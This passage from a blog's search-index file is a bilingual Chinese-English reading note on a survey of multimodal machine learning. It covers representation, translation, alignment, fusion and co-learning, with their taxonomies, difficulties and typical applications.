title="Challenges"></a>Challenges</h3><ol><li>Represatation（表征）<blockquote><p>学习怎样以一种利用多模态的互补性和冗余性的方式，表示和汇总多模态数据。多模态数据具有异构性。</p></blockquote></li><li>Translation（翻译）<blockquote><p>怎样将数据从一种模态转换（映射）为另一种模态。除了数据的异构性，模态之间的关系往往是开放或主观的。eg：描述一张图像的正确方法有很多，但是没有一种完美的translation。</p></blockquote></li><li>Alignment（对齐）<blockquote><p>从两种或两种以上的不同模态中，确定（子）要素之间的直接关系。eg：将菜谱中的步骤与显示正在制作的菜肴的视频对齐。为了应对这一挑战，我们需要衡量不同模态之间的相似性，并且处理可能的长期依赖性和模糊性。</p></blockquote></li><li>Fusion（融合）<blockquote><p>融合两个或多个模态的信息来进行预测。eg：对于视听语音识别，将嘴唇运动的视觉描述与语音信号融合来预测说的单词。来自不同模态的信息可能具有不同的预测能力和噪声拓扑，其中至少一种模态可能会有缺失数据。</p></blockquote></li><li>Co-learning（联合学习）<blockquote><p>在模态、模态地表示和模态的预测模型之间传递知识。这一点可以通过co-learning, conceptual grounding和one-shot learning的算法来证明。co-learning探索了怎样利用从一个模态学习的知识，来帮助在不同模态上训练的计算模型。当其中一种模态的资源有限时（如标注数据），这一挑战尤其重要。</p></blockquote></li></ol><h3 id="Summary-of-applicatons-and-the-core-technical-challenges-to-be-addressed"><a href="#Summary-of-applicatons-and-the-core-technical-challenges-to-be-addressed" class="headerlink" title="Summary of applicatons and the core technical challenges to be addressed"></a>Summary of applicatons and the core technical challenges to be addressed</h3><p><img src="1.PNG" alt=""></p><h3 id="Representation"><a href="#Representation" class="headerlink" title="Representation"></a>Representation</h3><p>we use the term feature and representation interchangeably, with each referring to a vector or tensor representation of an entity, be it an image, audio sample, individual word, or a sentence.<br><strong>A multimodal representation is a representation of data using information from multiple such entities.</strong><br>以一种计算模型能采用工作的形式表示数据一直是machine learning的一个挑战。<br>我们可以互换使用“特征”和“表示”，每个都是一个实体的向量或张量表示，它可以是一张图像，音频样本，单个单词或一个句子。multimodal representation是使用来自多个这样的实体的信息来表示数据的一种表示。<br><strong>表征是一个非常基础的任务，好的表征能极大的提高模型的表现。<br>利用多模态表示学习到的特征可以用来做信息检索，也可以用于的分类/回归任务。下面列举几个经典的应用。</strong></p><h4 id="Difficulties"><a href="#Difficulties" class="headerlink" title="Difficulties"></a>Difficulties</h4><ol><li>数据的异构性，如文字是符号性的，图片是一个RGB矩阵，视频是时序的RGB矩阵，声音的采样结果是一个一位数组。</li><li>不同模态产生的噪声的级别不同。</li><li>数据的缺失问题。</li></ol><h4 id="Good-Properties"><a href="#Good-Properties" class="headerlink" title="Good Properties"></a>Good Properties</h4><p>以一种比较有意义的方式表示数据的能力，对于多模态问题至关重要，并且是任意模型的骨干。</p><ul><li>smoothness（平滑）</li><li>temporal and spatial coherence（时间与空间的一致性）</li><li>sparsity（稀疏性）</li><li>natural clustering（自然聚类）</li><li>similarity in the representation space should reflect the similarity of the corresponding concepts（表示空间的相似性应该反映相应概念的相似性）</li><li>the representation should be easy to obtain even in the absence of some modalities（即使在某些模态数据缺失的情况下，也应该很容易获得representation）</li><li>it should be possible to all-in missing modalities given the observed ones（在给定已有的模态的情况下，应该可以确定缺失的模态）</li></ul><h4 id="两种-unimodal-representation"><a href="#两种-unimodal-representation" class="headerlink" title="两种 unimodal representation"></a>两种 unimodal representation</h4><p>在自然语言处理中，文本特征最初依赖于计算文档中单词出现的次数，但现在多用“利用单词上下文的数据驱动的单词嵌入”（unimodal representation）。<br>虽然unimodal representation方面有大量的工作，但直到近期，大多数multimodal representation只是将unimodal ones简单连接在一起，不过这一点正在改变。</p><ul><li>Joint representations<blockquote><p>将unimodal signals组合到同一个表示空间中，代表方法有神经网络的方法、图模型方法与序列模型方法。<br>主要（但不是唯一）用于：在train和inference步骤中都存在多模态数据的任务。<br>最简单的例子就是：单个模态特征的串联（也称为早期融合）。</p></blockquote></li><li>Coordinated representations<blockquote><p>分别处理unimodal signals，但要对它们增加一定的相似性约束，使它们变成我们想要的协同空间（coordinated space）<br>协调方法特征仍在原空间，但是通过相似度或者结构特征协调。</p></blockquote></li></ul><ol><li>Joint representations将多模态数据映射到公共空间中，更适合于：在推理（inference）过程中，所有模态都存在。广泛应用于：AVSR，情感和多模态手势识别。</li><li>Coordinated representations将每个模态分别映射到分开的但是协同的空间中，更适合于：在测试时只有一种模态，应用于：multimodal retrieval and representation, grounding, zero shot learning。</li><li>另外，joint representations用于两种以上模态的情形。coordinated representation大多限制到2种。</li></ol><p><img src="2.png" alt=""></p><h4 id="Representation-Taxonomy"><a href="#Representation-Taxonomy" class="headerlink" title="Representation Taxonomy"></a>Representation Taxonomy</h4><p><img src="3.png" alt=""></p><h5 id="1-neural-networks"><a href="#1-neural-networks" class="headerlink" title="(1) neural networks"></a>(1) neural networks</h5><p>一般来说，神经网络由连续的内积，后跟非线性激活函数组成。为了用神经网络来表示数据，首先要对其进行训练，使之能够执行特定的任务（eg：识别图像中的对象）。由于深度神经网络的多层性，假设每个连续层以更抽象的方式表示数据，因此通常使用最后一层或倒数第二层作为数据表示形式。</p><p>为了利用神经网络构造multimodal representation，每个模态从几个单独的神经层开始，然后是一个隐层，将模态映射到一个联合空间中。然后，the joint multimodal representation被送到多个隐藏层中，或直接用来预测。这样的模型可以通过端到端的学习来表示数据并执行特定任务。所以在使用神经网络时，multimodal representation学习和multimodal fusion之间由很密切的联系。</p><p>由于神经网络需要大量标记的训练数据，因此通常使用来自不同，但是相关的领域的无监督数据（eg：自动编码器模型）或监督数据，对此类表示进行训练。</p><p>基于neural network的joint representations的主要优点是：当标记的数据不足以进行监督利用未标记的数据进行学习时，能够利用未标记的数据进行预训练。通常也被用于对现有的特定任务的结果表示进行微调，因为利用无监督数据构建的表示是通用的，并且不一定需要它是最好的。</p><p>其中一个缺点是：不能很自然地处理丢失地数据，尽管有很多方法缓解这个问题。</p><h5 id="2-probabilistic-graphical-models"><a href="#2-probabilistic-graphical-models" class="headerlink" title="(2) probabilistic graphical models"></a>(2) probabilistic graphical models</h5><p>概率图模型，可以用潜在的随机变量来构造表示。</p><p>DBMs（深度玻尔兹曼机）不需要监督数据来进行训练。由于是图模型，数据的表示是概率的，但是可以将其转换为确定的神经网络，但是这将失去模型的生成方面。</p><p>在单模态数据进行非线性转换后，整合数据，对模型是非常有利的。</p><p>使用多模态DBMs学习multimodal representations的一个很大的优点是：生成性。这一特性使得处理丢失数据的方法更简单，即使丢失了整个模态，模型也能自然的处理。还可以在第二种模态存在的情况下，生成第一种模态的样本，或者从representation中生成两种模态。与自动编码器类似，the representation可以使用未标记的数据进行无监督训练。</p><p>DBMs的主要缺点是：训练难度大——计算成本高；需要使用近似变分训练方法（approximate variational training methods）。</p><h5 id="3-sequential-representation"><a href="#3-sequential-representation" class="headerlink" title="(3) sequential representation"></a>(3) sequential representation</h5><p>我们通常需要表示不同长度的序列，eg: sentences, videos, audio streams。RNNs及其变体LSTM在不同任务的序列建模方面取得了成功。到目前为止，RNN主要用于表示单模态的单词、音频或图像序列，在语言领域取得很大的成功。与传统的神经网络相似，RNN的隐藏态可以看作是数据的一种表示，也就是说，RNN在时间步t处的隐藏态，可以看作是该时间步之前序列的总结</p><h5 id="4-similarity-models"><a href="#4-similarity-models" class="headerlink" title="(4) similarity models"></a>(4) similarity models</h5><p>相似性模型最小化了协同空间中模态之间的距离。eg: 使单词”dog”与dog的图像之间的距离小于单词”dog”和car的图像之间的距离。</p><p>近年来，由于神经网络的学习表示的能力，所以神经网络已经成为一种常用的构造coordinated representations的方法。优势就在于神经网络可以以端到端的方式一起学习coordinated representations。这种coordinated representation的一个例子：DeViSE——一种深层视觉语义嵌入。</p><p>cross-model retrieval和video description任务，通常用：&lt;主语，动词，宾语&gt;，即&lt;subject, verb, object&gt;组合的语言模型和深层视频模型，来在video和sentence之间构造coordinated space。</p><h5 id="5-structured-coordinated-space"><a href="#5-structured-coordinated-space" class="headerlink" title="(5) structured coordinated space"></a>(5) structured coordinated space</h5><p>上面的模型增强了representations之间的相似性，但structured coordinated space模型超越了这一点，并且增强了模态表示之间额外的约束。增强的结构的类型通常是基于应用的，hashing, cross-modal retrieval, image captioning的约束是不同的。</p><p>structured coordinated spaces通常用于跨模态哈希——将高维数据压缩成紧凑的二进制代码，相似的对象有相似的二进制代码。hashing在结果多模态空间上增强了一定的约束：1）它必须是一个N维Hamming空间——一个具有可控位数的二进制表示。2）不同模态的相同对象必须有相似的hash code。3）空间必须保持相似性。</p><p>structured coordinated representation的另一个例子，来自图像和语言的顺序嵌入。</p><p>structured coordinated space的一个特殊情况：基于典型相关分析（canonical correlation analysis, CCA）,CCA计算线性投影，使两个变量（文中是指模态）之间的相关性最大化，并且增强新空间的正交性。CCA模型已经广泛用于cross-modal retrieval和audiovisual signal analysis。CCA的延伸尝试构造相关最大化非线性映射。</p><p>（还有KCCA，DCCA，略）</p><p>CCA，KCCA，DCCA都是无监督的，仅优化representations之间的相关性，因此捕捉的多是模态间共享的东西。深度典型相关的自动编码器还包括基于自动编码器的数据重建项。这鼓励了representation捕捉模态的特有信息。语义相关最大化方法也支持语义相关性，同时保留相关性最大化和结果空间的正交性，这也促进了CCA和cross-modal hashing技术的结合。</p><h4 id="经典应用"><a href="#经典应用" class="headerlink" title="经典应用"></a>经典应用</h4><ol><li>在来自 NIPS 2012 的 《Multimodal learning with deep boltzmann machines》一文中提出将 deep boltzmann machines（DBM） 结构扩充到多模态领域，通过 Multimodal DBM，可以学习到多模态的联合概率分布。</li><li>协同表示学习一个比较经典且有趣的应用是来自于《Unifying Visual-Semantic Embeddings with Multimodal Neural Language Models 》这篇文章。利用协同学习到的特征向量之间满足加减算数运算这一特性，可以搜索出与给定图片满足“指定的转换语义”的图片。例如：<br>狗的图片特征向量 - 狗的文本特征向量 + 猫的文本特征向量 = 猫的图片特征向量 -&gt; 在特征向量空间，根据最近邻距离，检索得到猫的图片</li></ol><h3 id="Translation"><a href="#Translation" class="headerlink" title="Translation"></a>Translation</h3><p>实际上也可以理解为映射（mapping）。MML很大一部分研究专注于将一种模态数据翻译（映射）为另一种模态数据。</p><h4 id="Technique-Classfication"><a href="#Technique-Classfication" class="headerlink" title="Technique Classfication"></a>Technique Classfication</h4><ul><li>example-based<blockquote><p>模型在模态之间translating时使用了一个dictionary。<br>从特征字典中找出最佳翻译。基于样本的方法分为基于检索式的和合并的方法。</p></blockquote></li><li>generative<blockquote><p>构造一个model，可以生成translation。<br>通过样本，训练一个翻译模型，并使用翻译模型完成对特征的转换。生成式的方法有基于语法的、encoder-decoder模型和连续模型。</p></blockquote></li></ul><p>简单的理解：测试阶段，example-based是需要字典的，而生成式是不需要字典的，它通过数据学习到两个模态潜在的映射关系。<br>可以说，构造generative模型更具挑战性，因为它要求能够生成信号或符号序列（eg, sentences）。这对于任何模态——visual, acoustic(听觉)，verbal(语言)来说都是困难的，尤其是需要生成时间上和结构上一致的序列时。这使得很多早期的multimodal translation系统依赖于example-based translation。</p><p><img src="4.png" alt=""></p><h4 id="Difficulties-1"><a href="#Difficulties-1" class="headerlink" title="Difficulties"></a>Difficulties</h4><ol><li>open-ended，即未知结束位，例如实时翻译中，在还未得到句尾的情况下，必须实时的对句子进行翻译.</li><li>另一个是subjective，即主观评判性，是指很多模态转换问题的效果没有一个比较客观的评判标准，也就是说目标函数的确定是非常主观的。例如，在图片描述中，形成怎样的一段话才算是对图片好的诠释？也许一千个人心中有一千个哈姆雷特吧。非常难于评估，因为这类任务没有标准答案，答案通常非常开放和主观。这其实也是机器翻译面临的问题。</li></ol><p>为了解决评估困难，提出了VQA（Visual question-answering）任务。然而它也有问题，例如特定问题的歧义性，回答和问题偏置(ambiguity of certain questions and answers and question bias)。</p><h4 id="Translation-Taxonomy"><a href="#Translation-Taxonomy" class="headerlink" title="Translation Taxonomy"></a>Translation Taxonomy</h4><p><img src="5.png" alt=""></p><h4 id="example-based"><a href="#example-based" class="headerlink" title="example-based"></a>example-based</h4><h5 id="retrieval-based模型"><a href="#retrieval-based模型" class="headerlink" title="retrieval-based模型"></a>retrieval-based模型</h5><blockquote><p>直接使用retrieved translation,并没有对其进行修改。</p></blockquote><p>retrieval-based模型可以说是multimodal translation中最简单的形式，它依靠找到dictionary中最近的样本，并将其作为translate的结果，检索可以在单模态空间或中间语义空间（intermediate semantic space）中进行。</p><p>给出一个要translate的单模态实例，单模态检索要在源空间的dictionary中找到最接近的实例。</p><p>这种单模态检索方法的优点：它只需要我们正在检索的单个模态的representation.（The advantage of such unimodal retrieval approches is that they only require the representation of a single modality through which we are performing retrieval.）然而，它通常需要额外的多模态后续处理步骤，比如对retrieved translation进行重新排序，这表明这种方法的一个主要问题：单模态空间的相似性并不总意味着时良好的选择。</p><p>另一种方法是在retrieval过程中，使用中间语义空间来进行相似性比较。</p><p>语义空间中的检索方法往往比单模态检索方法更好，因为它们在一个更具意义的空间检索示例，该空间反映了2中模态，并且通常会对检索进行优化。此外，它也可以进行双向translation，这在单模态方法中并不容易。然而，这需要人为地去构造或学习这样一种语义空间，并且需要有大型训练dictionary（成对样本数据集）。</p><h5 id="combination-based模型"><a href="#combination-based模型" class="headerlink" title="combination-based模型"></a>combination-based模型</h5><blockquote><p>依赖于更复杂的规则，基于大量检索实例来创建translation。</p></blockquote><p>使retrieval-based方法更进一步，它不仅仅是从dictionary中检索示例，还会用一种更有意义的方法把这些示例结合起来，来构造更好的translation。基于组合的媒体描述方法是基于：图像的句子描述共享一个可以被利用的公共的、简单的结构。最常见的组合规则是手动的或基于启发式的。</p><h5 id="example-based方法存在的问题"><a href="#example-based方法存在的问题" class="headerlink" title="example-based方法存在的问题"></a>example-based方法存在的问题</h5><ol><li>模型是整个字典，这就会使模型很大，推理起来很慢（不过，hashing之类的方法可以缓解）。</li><li>除非任务很简单，或者字典很大，否则，期望与源例相关的、完整的、准确的translation总是存在于字典中是不现实的。（combination模型能构造更复杂的结构，所以能部分解决上述问题，然而它也只能在一个方向上进行translate，不过，semantic space retrieval-based模型可以在两个方向上进行translate.）</li></ol><h4 id="generative"><a href="#generative" class="headerlink" title="generative"></a>generative</h4><h5 id="grammar-based"><a href="#grammar-based" class="headerlink" title="grammar-based"></a>grammar-based</h5><blockquote><p>通常通过使用语法来限制目标域，以简化任务，eg：基于&lt;subject, object, verb&gt;模板来生成受限制的句子。</p></blockquote><p>基于语法的模型，根据预定义的语法，来生成特定的模态。首先，从源模态中检测高级概念，比如图像中的对象、视频中的动作。然后，将这些检测到的高级概念，与基于预定义的语法的生成程序，结合到一起，以生成目标模态。</p><p>grammar-based方法的优点是：因为它们使用预定义的模板和限定的语法，所以很可能生成在语法上（对于language）或逻辑上正确的目标实例。缺点：限制了它们，只能生成公式化的而不是创造性的translation。</p><p>此外，grammar-based方法依赖于更复杂的pipline来进行概念检测，每个概念都需要一个单独的model和一个单独的训练集。</p><h5 id="encoder-decoder"><a href="#encoder-decoder" class="headerlink" title="encoder-decoder"></a>encoder-decoder</h5><blockquote><p>首先将源模态编码成潜在表示，然后送到解码器中，生成目标模态。</p></blockquote><p>基于端到端训练的神经网络的编码器-解码器模型是目前最流行的multimodal translation技术之一。这种模型背后的主要思想：首先，将源模态编码为向量表示，然后，用解码器生成目标模态，所有这些都是在单过程pipline进行的。</p><p>使用RNN生成translation面临的问题：模型必须从图像、句子或视频的单个向量representation中生成描述。这在生成长序列时，尤其困难，因为模型可能会忘记初始输入。通过在解码过程中的每一步，包含进编码信息，可以部分解决这个问题。还提出了注意力模型，使生成期间，解码器能更好的聚焦于图像、句子或视频的某些部分。</p><p>最近，在使用生成对抗网络生成图像方面取得了很大的进展，该网络已被用作RNN的替代方案，用于“从文本生成图像”。</p><h5 id="continuous-generation"><a href="#continuous-generation" class="headerlink" title="continuous generation"></a>continuous generation</h5><blockquote><p>基于源模态输入流，连续生成目标模态；最适合在时间序列之间translate. eg：文本到语音（text-to-speech）。</p></blockquote><p>用于序列translation,以在线的方式，在每个时间步都生成输出。当从一个序列translate到另一个序列时（eg：text to speech, speech to text, video to text），这些模型很有用。</p><p>针对这类模型提出的不同技术： graphical modals, continuous encoder-decoder approaches，以及其他回归或分类技术。</p><p>这列模型需要解决的额外的困难：模态间时间一致性的需求。</p><p>早期，许多工作使用图模型来在连续信号之间进行multimodal translation，然而这些方法正在被基于神经网络编码器-解码器的技术所取代。</p><h4 id="经典应用-1"><a href="#经典应用-1" class="headerlink" title="经典应用"></a>经典应用</h4><ol><li>机器翻译（Machine Translation）：将输入的语言A（即时）翻译为另一种语言B。类似的还有唇读（Lip Reading）和语音翻译 （Speech Translation），分别将唇部视觉和语音信息转换为文本信息。</li><li>图片描述（Image captioning) 或者视频描述（Video captioning)： 对给定的图片/视频形成一段文字描述，以表达图片/视频的内容。</li><li>语音合成（Speech Synthesis）：根据输入的文本信息，自动合成一段语音信号。</li></ol><h3 id="Alignment"><a href="#Alignment" class="headerlink" title="Alignment"></a>Alignment</h3><p>从两个甚至多个模态中寻找事物子成份之间的关系和联系。对齐可以是空间维度的，比如图片语义分割，给定一张图片和图片的描述，找到图中的某个区域以及这个区域在描述中对应的表述。也可以是时间维度的，比如给定一个美食制作视频和对应的菜谱，实现菜谱中的步骤描述与视频分段的对应。</p><p>对齐分为两类：<strong>显式对齐和隐式对齐</strong>。显式对齐即应用的主要任务就是对齐，而隐式对齐是指应用在完成主要任务时需要用到对齐的技术。</p><h4 id="技术方法分类"><a href="#技术方法分类" class="headerlink" title="技术方法分类"></a>技术方法分类</h4><ol><li>显示对齐：Unsupervised；(Weakly)Supervised</li><li>隐式对齐：Graphical models；Neural networks（attention机制）</li></ol><h4 id="Difficulties-2"><a href="#Difficulties-2" class="headerlink" title="Difficulties"></a>Difficulties</h4><ol><li>很少有显式对齐标注的数据集</li><li>不同模态之间相似度的计算难以建模</li><li>存在多个可能的对齐方案，此外不是一个模态的所有元素在另一个模态中都存在对应</li></ol><h4 id="Alignment-Taxonomy"><a href="#Alignment-Taxonomy" class="headerlink" title="Alignment Taxonomy"></a>Alignment Taxonomy</h4><p><img src="6.png" alt=""></p><h3 id="Fusion"><a href="#Fusion" class="headerlink" title="Fusion"></a>Fusion</h3><p>多模态融合指从多个模态信息中整合信息来完成分类或回归任务。“multimodal fusion is the concept of integrating information from multiple modalities with the goal of predicting an outcome measure: a class (e.g., happy vs. sad) through classi?cation, or a continuous value (e.g., positivity of sentiment) through regression.”即是负责联合多个模态的信息，进行目标预测（分类或者回归）</p><p>融合还有更宽泛的定义，而综述中定义的融合，是指任务在最后预测并以预测输出值为目的时才进行多模态融合。在深度神经网络方法下，融合和表征两个任务是很难区分的。但在图模型以及基于核的方法中比较好区分。</p><p>多模态特征融合是指将从不同模态的特征集成在一起，共同完成一个任务，如分类。</p><h4 id="Significances"><a href="#Significances" class="headerlink" title="Significances"></a>Significances</h4><ol><li>在观察同一个现象时引入多个模态，可能带来更robust的预测</li><li>接触多个模态的信息，可能让我们捕捉到互补的信息（complementary information），尤其是这些信息在单模态下并不“可见”时。</li><li>一个多模态系统在缺失某一个模态时依旧能工作</li></ol><p>多模态融合有两大类：<strong>无模型model-agnostic</strong>；<strong>基于模型model-based</strong></p><blockquote><p><strong>model-agnostic</strong>：不直接依赖于某个特定的机器学习算法</p></blockquote><ul><li><strong>early fusion</strong> 也称为feature-based，是基于特征的。通常是在提取各模态特征后就进行融合，一般只是简单地连接他们的表征，即joint representation。并使用融合后的数据进行模型训练，相比之后两种在训练上更为简单。</li><li><strong>late fusion</strong> 也称为decision-based，是基于决策的。该方法在各个模态做出决策后才进行融合，得出最终的决策。常见的机制有平均（averaging）、投票（voting schemes）等等。这种方法中，各模态可以使用不同的模型来训练，带来更多的便利性。</li><li><strong>hybrid fusion</strong> 一种尝试结合early fusion和late fusion优势的方法。</li></ul><blockquote><p><strong>model-based</strong>：显式得在构造中完成融合</p></blockquote><ul><li><strong>Multiple Kernel Learning</strong> 多核学习</li><li><strong>Graphical models</strong> 图模型</li><li><strong>Neural Networks</strong> 神经网络</li><li>神经网络在近期成为解决融合问题非常流行的方案，然而图模型以及多核学习依旧被使用，尤其是在有限的训练数据和模型可解释性非常重要的情况下。</li></ul><h4 id="Difficulties-3"><a href="#Difficulties-3" class="headerlink" title="Difficulties"></a>Difficulties</h4><p>多模态融合研究的难点主要包括如何判断每个模态的置信水平、如何判断模态间的相关性、如何对多模态的特征信息进行降维以及如何对非同步采集的多模态数据进行配准等。</p><ol><li>信号可能并不是时序对齐的（temporally aligned）。很可能是密集的连续信号和稀疏的事件（比如一大段视频只对应一个词，然后整个视频只对应稀少的几个词）。</li><li>it is difficult to build models that exploit supplementary and not only complementary information</li><li>每一个模态在不同的时间点可能表现出不同的形式和不同等级的噪声</li></ol><h4 id="Fusion-Taxonomy"><a href="#Fusion-Taxonomy" class="headerlink" title="Fusion Taxonomy"></a>Fusion Taxonomy</h4><p><img src="7.png" alt=""></p><h4 id="经典应用-2"><a href="#经典应用-2" class="headerlink" title="经典应用"></a>经典应用</h4><ol><li>视觉-音频识别（Visual-Audio Recognition）： 综合源自同一个实例的视频信息和音频信息，进行识别工作。</li><li>多模态情感分析（Multimodal sentiment analysis）： 综合利用多个模态的数据（例如下图中的文字、面部表情、声音），通过互补，消除歧义和不确定性，得到更加准确的情感类型判断结果。</li><li>手机身份认证（Mobile Identity Authentication）： 综合利用手机的多传感器信息，认证手机使用者是否是注册用户。</li></ol><h3 id="Co-Learning"><a href="#Co-Learning" class="headerlink" title="Co-Learning"></a>Co-Learning</h3><ul><li>联合学习的目的是通过利用资源丰富（比如数据量大）的模态的知识来辅助资源稀缺（比如较小数据）的模态建立模型。比如迁移学习（Transfer Learning）就是属于这个范畴，绝大多数迈入深度学习的初学者尝试做的一项工作就是将 ImageNet 数据集上学习到的权重，在自己的目标数据集上进行微调。</li><li>联合学习 is task independent and could be used to create better fusion, translation, and alignment models.</li><li>联合学习中，辅助模态（helper modality）通常只参与模型的训练过程，并不参与模型的测试使用过程。即使用时，模型输入并不需要辅助模态的数据。</li></ul><h4 id="联合学习的分类是基于训练资源（数据）形式划分的"><a href="#联合学习的分类是基于训练资源（数据）形式划分的" class="headerlink" title="联合学习的分类是基于训练资源（数据）形式划分的"></a>联合学习的分类是基于训练资源（数据）形式划分的</h4><p><img src="9.png" alt=""><br><strong>parallel</strong> modalities are from the same dataset and there is a direct correspondence between instances;<br><strong>non-parallel</strong> modalities are from different datasets and do not have overlapping instances, but overlap in general categories or concepts;<br><strong>hybrid</strong> the instances or concepts are bridged by a third modality or a dataset.</p><h4 id="Co-Learning-Taxonomy"><a href="#Co-Learning-Taxonomy" class="headerlink" title="Co-Learning Taxonomy"></a>Co-Learning Taxonomy</h4><p><img src="8.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Deep Learning </tag>
            
            <tag> Machine Learning </tag>
            
            <tag> Multimodal </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
